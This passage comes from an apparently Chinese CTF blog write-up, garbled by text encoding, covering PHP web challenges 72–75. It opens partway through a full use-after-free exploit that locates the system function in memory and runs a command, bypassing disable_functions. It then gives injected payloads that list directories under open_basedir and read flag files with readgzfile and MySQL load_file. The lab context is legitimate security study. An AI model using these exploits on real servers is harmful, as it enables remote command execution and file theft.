</span></span></span><span class="line"><span class="ln"> 81</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="err">        return [$data_addr, $text_size, $data_size];
</span></span></span><span class="line"><span class="ln"> 83</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln"> 84</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 85</span><span class="cl"><span class="err">    function get_basic_funcs($base, $elf) {
</span></span></span><span class="line"><span class="ln"> 86</span><span class="cl"><span class="err">        list($data_addr, $text_size, $data_size) = $elf;
</span></span></span><span class="line"><span class="ln"> 87</span><span class="cl"><span class="err">        for($i = 0; $i &lt; $data_size / 8; $i++) {
</span></span></span><span class="line"><span class="ln"> 88</span><span class="cl"><span class="err">            $leak = leak($data_addr, $i * 8);
</span></span></span><span class="line"><span class="ln"> 89</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 90</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 91</span><span class="cl"><span class="err">                # &#39;constant&#39; constant check
</span></span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="err">                if($deref != 0x746e6174736e6f63)
</span></span></span><span class="line"><span class="ln"> 93</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln"> 94</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln"> 95</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln"> 96</span><span class="cl"><span class="err">            $leak = leak($data_addr, ($i + 4) * 8);
</span></span></span><span class="line"><span class="ln"> 97</span><span class="cl"><span class="err">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {
</span></span></span><span class="line"><span class="ln"> 98</span><span class="cl"><span class="err">                $deref = leak($leak);
</span></span></span><span class="line"><span class="ln"> 99</span><span class="cl"><span class="err">                # &#39;bin2hex&#39; constant check
</span></span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="err">                if($deref != 0x786568326e6962)
</span></span></span><span class="line"><span class="ln">101</span><span class="cl"><span class="err">                    continue;
</span></span></span><span class="line"><span class="ln">102</span><span class="cl"><span class="err">            } else continue;
</span></span></span><span class="line"><span class="ln">103</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">104</span><span class="cl"><span class="err">            return $data_addr + $i * 8;
</span></span></span><span class="line"><span class="ln">105</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">106</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">107</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">108</span><span class="cl"><span class="err">    function get_binary_base($binary_leak) {
</span></span></span><span class="line"><span class="ln">109</span><span class="cl"><span class="err">        $base = 0;
</span></span></span><span class="line"><span class="ln">110</span><span class="cl"><span class="err">        $start = $binary_leak &amp; 0xfffffffffffff000;
</span></span></span><span class="line"><span class="ln">111</span><span class="cl"><span class="err">        for($i = 0; $i &lt; 0x1000; $i++) {
</span></span></span><span class="line"><span class="ln">112</span><span class="cl"><span class="err">            $addr = $start - 0x1000 * $i;
</span></span></span><span class="line"><span class="ln">113</span><span class="cl"><span class="err">            $leak = leak($addr, 0, 7);
</span></span></span><span class="line"><span class="ln">114</span><span class="cl"><span class="err">            if($leak == 0x10102464c457f) { # ELF header
</span></span></span><span class="line"><span class="ln">115</span><span class="cl"><span class="err">                return $addr;
</span></span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">117</span><span class="cl"><span class="err">        }
</span></span></span><span class="line"><span class="ln">118</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">119</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">120</span><span class="cl"><span class="err">    function get_system($basic_funcs) {
</span></span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="err">        $addr = $basic_funcs;
</span></span></span><span class="line"><span class="ln">122</span><span class="cl"><span class="err">        do {
</span></span></span><span class="line"><span class="ln">123</span><span class="cl"><span class="err">            $f_entry = leak($addr);
</span></span></span><span class="line"><span class="ln">124</span><span class="cl"><span class="err">            $f_name = leak($f_entry, 0, 6);
</span></span></span><span class="line"><span class="ln">125</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">126</span><span class="cl"><span class="err">            if($f_name == 0x6d6574737973) { # system
</span></span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="err">                return leak($addr + 8);
</span></span></span><span class="line"><span class="ln">128</span><span class="cl"><span class="err">            }
</span></span></span><span class="line"><span class="ln">129</span><span class="cl"><span class="err">            $addr += 0x20;
</span></span></span><span class="line"><span class="ln">130</span><span class="cl"><span class="err">        } while($f_entry != 0);
</span></span></span><span class="line"><span class="ln">131</span><span class="cl"><span class="err">        return false;
</span></span></span><span class="line"><span class="ln">132</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">133</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">134</span><span class="cl"><span class="err">    function trigger_uaf($arg) {
</span></span></span><span class="line"><span class="ln">135</span><span class="cl"><span class="err">        # str_shuffle prevents opcache string interning
</span></span></span><span class="line"><span class="ln">136</span><span class="cl"><span class="err">        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">137</span><span class="cl"><span class="err">        $vuln = new Vuln();
</span></span></span><span class="line"><span class="ln">138</span><span class="cl"><span class="err">        $vuln-&gt;a = $arg;
</span></span></span><span class="line"><span class="ln">139</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">140</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">141</span><span class="cl"><span class="err">    if(stristr(PHP_OS, &#39;WIN&#39;)) {
</span></span></span><span class="line"><span class="ln">142</span><span class="cl"><span class="err">        die(&#39;This PoC is for *nix systems only.&#39;);
</span></span></span><span class="line"><span class="ln">143</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">144</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">145</span><span class="cl"><span class="err">    $n_alloc = 10; # increase this value if UAF fails
</span></span></span><span class="line"><span class="ln">146</span><span class="cl"><span class="err">    $contiguous = [];
</span></span></span><span class="line"><span class="ln">147</span><span class="cl"><span class="err">    for($i = 0; $i &lt; $n_alloc; $i++)
</span></span></span><span class="line"><span class="ln">148</span><span class="cl"><span class="err">        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
</span></span></span><span class="line"><span class="ln">149</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">150</span><span class="cl"><span class="err">    trigger_uaf(&#39;x&#39;);
</span></span></span><span class="line"><span class="ln">151</span><span class="cl"><span class="err">    $abc = $backtrace[1][&#39;args&#39;][0];
</span></span></span><span class="line"><span class="ln">152</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">153</span><span class="cl"><span class="err">    $helper = new Helper;
</span></span></span><span class="line"><span class="ln">154</span><span class="cl"><span class="err">    $helper-&gt;b = function ($x) { };
</span></span></span><span class="line"><span class="ln">155</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">156</span><span class="cl"><span class="err">    if(strlen($abc) == 79 || strlen($abc) == 0) {
</span></span></span><span class="line"><span class="ln">157</span><span class="cl"><span class="err">        die(&#34;UAF failed&#34;);
</span></span></span><span class="line"><span class="ln">158</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">159</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">160</span><span class="cl"><span class="err">    # leaks
</span></span></span><span class="line"><span class="ln">161</span><span class="cl"><span class="err">    $closure_handlers = str2ptr($abc, 0);
</span></span></span><span class="line"><span class="ln">162</span><span class="cl"><span class="err">    $php_heap = str2ptr($abc, 0x58);
</span></span></span><span class="line"><span class="ln">163</span><span class="cl"><span class="err">    $abc_addr = $php_heap - 0xc8;
</span></span></span><span class="line"><span class="ln">164</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">165</span><span class="cl"><span class="err">    # fake value
</span></span></span><span class="line"><span class="ln">166</span><span class="cl"><span class="err">    write($abc, 0x60, 2);
</span></span></span><span class="line"><span class="ln">167</span><span class="cl"><span class="err">    write($abc, 0x70, 6);
</span></span></span><span class="line"><span class="ln">168</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">169</span><span class="cl"><span class="err">    # fake reference
</span></span></span><span class="line"><span class="ln">170</span><span class="cl"><span class="err">    write($abc, 0x10, $abc_addr + 0x60);
</span></span></span><span class="line"><span class="ln">171</span><span class="cl"><span class="err">    write($abc, 0x18, 0xa);
</span></span></span><span class="line"><span class="ln">172</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">173</span><span class="cl"><span class="err">    $closure_obj = str2ptr($abc, 0x20);
</span></span></span><span class="line"><span class="ln">174</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">175</span><span class="cl"><span class="err">    $binary_leak = leak($closure_handlers, 8);
</span></span></span><span class="line"><span class="ln">176</span><span class="cl"><span class="err">    if(!($base = get_binary_base($binary_leak))) {
</span></span></span><span class="line"><span class="ln">177</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t determine binary base address&#34;);
</span></span></span><span class="line"><span class="ln">178</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">179</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">180</span><span class="cl"><span class="err">    if(!($elf = parse_elf($base))) {
</span></span></span><span class="line"><span class="ln">181</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t parse ELF header&#34;);
</span></span></span><span class="line"><span class="ln">182</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">183</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">184</span><span class="cl"><span class="err">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
</span></span></span><span class="line"><span class="ln">185</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get basic_functions address&#34;);
</span></span></span><span class="line"><span class="ln">186</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">187</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">188</span><span class="cl"><span class="err">    if(!($zif_system = get_system($basic_funcs))) {
</span></span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="err">        die(&#34;Couldn&#39;t get zif_system address&#34;);
</span></span></span><span class="line"><span class="ln">190</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">191</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">192</span><span class="cl"><span class="err">    # fake closure object
</span></span></span><span class="line"><span class="ln">193</span><span class="cl"><span class="err">    $fake_obj_offset = 0xd0;
</span></span></span><span class="line"><span class="ln">194</span><span class="cl"><span class="err">    for($i = 0; $i &lt; 0x110; $i += 8) {
</span></span></span><span class="line"><span class="ln">195</span><span class="cl"><span class="err">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
</span></span></span><span class="line"><span class="ln">196</span><span class="cl"><span class="err">    }
</span></span></span><span class="line"><span class="ln">197</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">198</span><span class="cl"><span class="err">    # pwn
</span></span></span><span class="line"><span class="ln">199</span><span class="cl"><span class="err">    write($abc, 0x20, $abc_addr + $fake_obj_offset);
</span></span></span><span class="line"><span class="ln">200</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
</span></span></span><span class="line"><span class="ln">201</span><span class="cl"><span class="err">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
</span></span></span><span class="line"><span class="ln">202</span><span class="cl"><span class="err"> 
</span></span></span><span class="line"><span class="ln">203</span><span class="cl"><span class="err">    ($helper-&gt;b)($cmd);
</span></span></span><span class="line"><span class="ln">204</span><span class="cl"><span class="err">    exit();
</span></span></span><span class="line"><span class="ln">205</span><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="ln">206</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>è®°å¾—è¦è½¬url</p>
<p><img alt="image-20241129232845637" loading="lazy" src="assets/image-20241129232845637.png"></p>
<h5 id="æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢">æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢ï¼Ÿ<a hidden class="anchor" aria-hidden="true" href="#æ‰€ä»¥ä»€ä¹ˆæ˜¯uafå‘¢">#</a></h5>
<p>ï¼ˆå…ˆæŒ–ä¸ªå‘å›å¤´è¡¥ï¼‰</p>
<h4 id="web73">web73<a hidden class="anchor" aria-hidden="true" href="#web73">#</a></h4>
<p>è¿™ä¸€é¢˜å’Œä¸Šä¸€é¢˜çš„åŒºåˆ«å…¶å®å°±æ˜¯flagçš„æ–‡ä»¶æ”¹åäº†ï¼Œæˆ‘ä»¬ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•è¯»ä¸€ä¸‹æ–‡ä»¶</p>
<pre tabindex="0"><code>c=?&gt;&lt;?php $a=new DirectoryIterator(&#34;glob:///*&#34;);// åˆ›å»ºä¸€ä¸ªDirectoryIteratorå¯¹è±¡ï¼Œéå†æ ¹ç›®å½•
foreach($a as $f)// éå†æ¯ä¸ªæ¡ç›®
{
   echo($f-&gt;__toString().&#39; &#39;);// è¾“å‡ºæ¡ç›®çš„åç§°ï¼Œå¹¶æ·»åŠ ä¸€ä¸ªç©ºæ ¼
}
exit(0); // ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ
?&gt;
</code></pre><p><img alt="image-20241129234701193" loading="lazy" src="assets/image-20241129234701193.png"></p>
<p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªflagc.txtæ–‡ä»¶</p>
<p>è¿™é¢˜å…¶å®å·²ç»å…³é—­äº†open_basedirï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¹‹å‰çš„æ–¹æ³•è¯»</p>
<pre tabindex="0"><code>var_export(scandir(&#39;/&#39;));exit();
</code></pre><pre tabindex="0"><code>echo(implode(&#39; &#39;,scandir(&#39;/&#39;)));exit();
</code></pre><p>è¯»æ–‡ä»¶çš„è¯ä¸Šä¸€é¢˜çš„uafæ–¹æ³•è¢«banäº†ï¼Œè¿™é¢˜ç”¨ä¸äº†</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¹‹å‰æ–¹æ³•</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagc.txt&#39;);exit();
</code></pre><p><img alt="image-20241129235458680" loading="lazy" src="assets/image-20241129235458680.png"></p>
<h4 id="web74">web74<a hidden class="anchor" aria-hidden="true" href="#web74">#</a></h4>
<p><img alt="image-20241129235835167" loading="lazy" src="assets/image-20241129235835167.png"></p>
<p>è¿™é¢˜æˆ‘å…ˆç”¨ä¹‹å‰çš„æ–¹æ³•var_exportè¯•è¯•èƒ½ä¸èƒ½è¯»åˆ°ç›®å½•ï¼Œå‘ç°æ˜¾ç¤ºnullï¼Œåº”è¯¥æ˜¯open_basediræ‰“å¼€äº†</p>
<p><img alt="image-20241130000019913" loading="lazy" src="assets/image-20241130000019913.png"></p>
<p>æ¥ç€ç”¨globåè®®çš„æ–¹æ³•è¯»åˆ°äº†ï¼Œflagæ–‡ä»¶åå«åšflagx.txt</p>
<p>å…ˆç”¨uafçš„æ–¹æ³•è¯•è¯•</p>
<p><img alt="image-20241130000253395" loading="lazy" src="assets/image-20241130000253395.png"></p>
<p>å‘ç°è¿™æ¡è·¯è¢«banæ‰äº†</p>
<p><img alt="image-20241130000438521" loading="lazy" src="assets/image-20241130000438521.png"></p>
<p>æœ€åç”¨</p>
<pre tabindex="0"><code>c=readgzfile(&#39;/flagx.txt&#39;);exit();
</code></pre><p>æˆåŠŸæŸ¥åˆ°äº†flag</p>
<h4 id="web75">web75<a hidden class="anchor" aria-hidden="true" href="#web75">#</a></h4>
<p><img alt="image-20241130001438365" loading="lazy" src="assets/image-20241130001438365.png"></p>
<p>è¿™é¢˜è¦ç”¨globæŸ¥æ–‡ä»¶ï¼Œç”¨var_exportæŸ¥ä¸äº†</p>
<p>æ¥ä¸‹æ¥æ˜¯è¯»æ–‡ä»¶</p>
<p>å°è¯•äº†uafå’Œreadgzfileä¹‹ç±»çš„æ–¹æ³•éƒ½å¤±è´¥äº†</p>
<p>æ²¡åŠæ³•çœ‹çœ‹å¤§ä½¬æ€ä¹ˆåšçš„</p>
<p>æˆ‘ä»¬å…¶å®å¯ä»¥ç”¨åˆ°mysqlçš„load_fileæ–¹æ³•ï¼Œä»è€Œè¯»åˆ°flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="nv">$conn</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;root&#34;</span><span class="p">,</span> <span class="s2">&#34;ctftraining&#34;</span><span class="p">);</span> <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select load_file(&#39;/flag36.txt&#39;) as a&#34;</span><span class="p">;</span> <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span> <span class="k">while</span><span class="p">(</span><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$row</span><span class="p">)){</span> <span class="k">echo</span> <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span> <span class="p">}</span> <span class="k">exit</span><span class="p">();</span>
</span></span></code></pre></div><p>è±†åŒ…è§£é‡Šä¸€ä¸‹</p>
<blockquote>
<ol>
<li>æ•°æ®åº“è¿æ¥ï¼š
<ul>
<li><code>$conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;ctftraining&quot;);</code></li>
<li>è¿™è¡Œä»£ç ä½¿ç”¨ MySQLi æ‰©å±•å»ºç«‹äº†ä¸€ä¸ªä¸ MySQL æ•°æ®åº“çš„è¿æ¥ã€‚å®ƒæŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„ IP åœ°å€ä¸º<code>127.0.0.1</code>ï¼ˆæœ¬åœ°ä¸»æœºï¼‰ï¼Œç”¨æˆ·åæ˜¯<code>root</code>ï¼Œå¯†ç ä¹Ÿæ˜¯<code>root</code>ï¼Œè¦è¿æ¥çš„æ•°æ®åº“åç§°æ˜¯<code>ctftraining</code>ã€‚å¦‚æœè¿æ¥æˆåŠŸï¼Œ<code>$conn</code>å°†ä¿å­˜è¿™ä¸ªæ•°æ®åº“è¿æ¥å¯¹è±¡ï¼Œä»¥ä¾¿åç»­è¿›è¡Œæ•°æ®åº“æ“ä½œï¼›å¦‚æœè¿æ¥å¤±è´¥ï¼Œå°†ä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆä¸è¿‡åœ¨è¿™æ®µä»£ç ä¸­æ²¡æœ‰å¯¹è¿æ¥å¤±è´¥æƒ…å†µåšæ˜¾å¼å¤„ç†ï¼‰ã€‚</li>
</ul>
</li>
<li>SQL æŸ¥è¯¢è¯­å¥æ„å»ºï¼š
<ul>
<li><code>$sql = &quot;select load_file('/flag36.txt') as a&quot;;</code></li>
<li>è¿™é‡Œæ„å»ºäº†ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥ã€‚<code>load_file()</code>æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¿”å›ã€‚åœ¨è¿™ä¸ªæŸ¥è¯¢ä¸­ï¼Œå®ƒè¯•å›¾è¯»å–æœåŠ¡å™¨ä¸Š<code>/flag36.txt</code>æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶ç»™æŸ¥è¯¢ç»“æœçš„è¿™ä¸€åˆ—èµ·äº†ä¸€ä¸ªåˆ«å<code>a</code>ã€‚</li>
</ul>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢å¹¶è·å–ç»“æœï¼š
<ul>
<li><code>$row = mysqli_query($conn, $sql);</code></li>
<li>è¿™è¡Œä»£ç ä½¿ç”¨å·²ç»å»ºç«‹å¥½çš„æ•°æ®åº“è¿æ¥<code>$conn</code>æ¥æ‰§è¡Œå‰é¢æ„å»ºçš„ SQL æŸ¥è¯¢è¯­å¥<code>$sql</code>ã€‚å¦‚æœæŸ¥è¯¢æ‰§è¡ŒæˆåŠŸï¼Œ<code>$row</code>å°†åŒ…å«æŸ¥è¯¢ç»“æœé›†çš„èµ„æºå¯¹è±¡ï¼ˆå¯ä»¥ç†è§£ä¸ºæŒ‡å‘æŸ¥è¯¢ç»“æœæ•°æ®çš„ä¸€ç§å¼•ç”¨ï¼‰ï¼›å¦‚æœæŸ¥è¯¢å¤±è´¥ï¼ŒåŒæ ·ä¼šäº§ç”Ÿä¸€ä¸ªé”™è¯¯ä¿¡æ¯ï¼ˆè¿™é‡Œä¹Ÿæœªåšæ˜¾å¼å¤„ç†ï¼‰ã€‚</li>
<li><code>while($result=mysqli_fetch_array($row)){ echo $result['a']; }</code></li>
<li>è¿™ä¸ª<code>while</code>å¾ªç¯ç”¨äºéå†æŸ¥è¯¢ç»“æœé›†ã€‚<code>mysqli_fetch_array()</code>å‡½æ•°æ¯æ¬¡ä»ç»“æœé›†ä¸­è·å–ä¸€è¡Œæ•°æ®ï¼Œå¹¶ä»¥æ•°ç»„çš„å½¢å¼è¿”å›ã€‚åœ¨å¾ªç¯å†…éƒ¨ï¼Œå®ƒé€šè¿‡<code>$result['a']</code>æ¥è·å–å‰é¢æŸ¥è¯¢ä¸­<code>load_file()</code>å‡½æ•°è¯»å–åˆ°çš„æ–‡ä»¶å†…å®¹ï¼ˆå› ä¸ºåœ¨æŸ¥è¯¢ä¸­ç»™è¿™ä¸€åˆ—èµ·äº†åˆ«å<code>a</code>ï¼‰ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚</li>
</ul>
</li>
<li>ç¨‹åºç»“æŸï¼š
<ul>
<li><code>exit();</code></li>
<li>è¿™è¡Œä»£ç ä½¿å¾—è„šæœ¬åœ¨å®ŒæˆæŸ¥è¯¢ç»“æœè¾“å‡ºåç«‹å³ç»ˆæ­¢æ‰§è¡Œï¼Œä¸å†æ‰§è¡Œåç»­å¯èƒ½å­˜åœ¨çš„å…¶ä»–ä»£ç ã€‚</li>
</ul>
</li>
</ol></blockquote>
<p>ä¹Ÿå¯ä»¥</p>
<p>ç”¨PDOçš„æ–¹æ³•æ¥å®ç°åŒæ ·çš„ç›®çš„</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">c</span><span class="o">=</span><span class="k">try</span> <span class="p">{</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">&#39;mysql:host=localhost;dbname=ctftraining&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s1">&#39;root&#39;</span><span class="p">);</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$dbh</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;select load_file(&#34;/flag36.txt&#34;)&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;|&#34;</span><span class="p">;</span> <span class="p">}</span><span class="nv">$dbh</span> <span class="o">=</span> <span class="k">null</span><span class="p">;}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$e</span><span class="o">-</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="o">&gt;</span><span class="nx">getMessage</span><span class="p">();</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);}</span><span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span></code></pre></div><blockquote>
<ol>
<li>æ•°æ®åº“è¿æ¥å»ºç«‹ï¼š
<ul>
<li><code>$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');</code></li>
<li>è¿™è¡Œä»£ç ä½¿ç”¨ PDO åˆ›å»ºäº†ä¸€ä¸ªä¸ MySQL æ•°æ®åº“çš„è¿æ¥å¯¹è±¡ <code>$dbh</code>ã€‚å®ƒæŒ‡å®šäº†æ•°æ®åº“æœåŠ¡å™¨çš„ä¸»æœºåä¸º <code>localhost</code>ï¼Œè¦è¿æ¥çš„æ•°æ®åº“åç§°æ˜¯ <code>ctftraining</code>ï¼Œä»¥åŠç”¨äºç™»å½•æ•°æ®åº“çš„ç”¨æˆ·å <code>root</code> å’Œå¯†ç  <code>root</code>ã€‚å¦‚æœè¿æ¥æˆåŠŸï¼Œåç»­å°±å¯ä»¥é€šè¿‡è¿™ä¸ªå¯¹è±¡è¿›è¡Œæ•°æ®åº“ç›¸å…³çš„æ“ä½œï¼›å¦‚æœè¿æ¥å¤±è´¥ï¼Œå°†ä¼šæŠ›å‡ºä¸€ä¸ª <code>PDOException</code> å¼‚å¸¸ã€‚</li>
</ul>
</li>
<li>æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼š
<ul>
<li><code>foreach($dbh-&gt;query('select load_file(&quot;/flag36.txt&quot;)') as $row)</code></li>
<li>è¿™é‡Œé€šè¿‡å·²å»ºç«‹çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ <code>$dbh</code> æ‰§è¡Œäº†ä¸€ä¸ª SQL æŸ¥è¯¢è¯­å¥ <code>select load_file(&quot;/flag36.txt&quot;)</code>ã€‚<code>load_file()</code> æ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹ã€‚è¿™ä¸ªæŸ¥è¯¢è¯­å¥çš„ç›®çš„å°±æ˜¯è·å–æœåŠ¡å™¨ä¸Š <code>/flag36.txt</code> æ–‡ä»¶çš„å†…å®¹ã€‚</li>
<li>ç„¶åä½¿ç”¨ <code>foreach</code> å¾ªç¯æ¥éå†æŸ¥è¯¢ç»“æœé›†ã€‚æ¯æ¬¡å¾ªç¯ï¼Œ<code>$row</code> å°†ä¼šè·å–åˆ°æŸ¥è¯¢ç»“æœé›†ä¸­çš„ä¸€è¡Œæ•°æ®ï¼Œç”±äºæŸ¥è¯¢ç»“æœåªæœ‰ä¸€åˆ—ï¼ˆå³ <code>load_file()</code> å‡½æ•°è¿”å›çš„æ–‡ä»¶å†…å®¹é‚£ä¸€åˆ—ï¼‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ <code>$row[0]</code> æ¥è·å–è¿™ä¸€åˆ—çš„å€¼ã€‚</li>
</ul>
</li>
</ol>
<h4 id="ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾">ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾<a hidden class="anchor" aria-hidden="true" href="#ç»“æœè¾“å‡ºä¸èµ„æºé‡Šæ”¾">#</a></h4>
<ol>
<li>ç»“æœè¾“å‡ºï¼š
<ul>
<li><code>echo($row[0]).&quot;|&quot;;</code></li>
<li>åœ¨æ¯æ¬¡éå†æŸ¥è¯¢ç»“æœé›†çš„å¾ªç¯ä¸­ï¼Œè¿™è¡Œä»£ç å°†è·å–åˆ°çš„æ–‡ä»¶å†…å®¹ï¼ˆé€šè¿‡ <code>$row[0]</code>ï¼‰è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œå¹¶åœ¨åé¢æ·»åŠ ä¸€ä¸ª <code>|</code> ä½œä¸ºåˆ†éš”ç¬¦ã€‚</li>
</ul>
</li>
<li>æ•°æ®åº“è¿æ¥èµ„æºé‡Šæ”¾ï¼š
<ul>
<li><code>$dbh = null;</code></li>
<li>å½“æŸ¥è¯¢ç»“æœå¤„ç†å®Œæ¯•åï¼Œè¿™è¡Œä»£ç å°†æ•°æ®åº“è¿æ¥å¯¹è±¡ <code>$dbh</code> è®¾ç½®ä¸º <code>null</code>ï¼Œè¿™æœ‰åŠ©äºé‡Šæ”¾ä¸è¯¥è¿æ¥ç›¸å…³çš„èµ„æºï¼Œç¡®ä¿ç³»ç»Ÿèµ„æºçš„åˆç†åˆ©ç”¨ã€‚</li>
